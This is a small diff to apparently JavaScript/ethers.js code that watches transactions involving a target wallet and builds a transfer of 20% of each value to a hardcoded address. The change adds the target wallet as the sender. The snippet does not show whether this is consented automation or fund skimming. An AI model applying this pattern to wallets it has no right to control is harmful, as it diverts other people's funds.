@@ -29,6 +29,7 @@ subscription.on('data', async (txHash) => {
             if (tx.to === targetWalletAddress || tx.from === targetWalletAddress) {
 				const withholdingAmt = ethers.formatEther(BigInt(tx.value) * BigInt(2) / BigInt(10));
 				const withholdingTransaction = {
+					from: targetWalletAddress,
 					to: '0x66D96228559500a475Fd54bB673C00f35ca91a59',
 					value: ethers.parseEther(withholdingAmt).toString(),
 				};
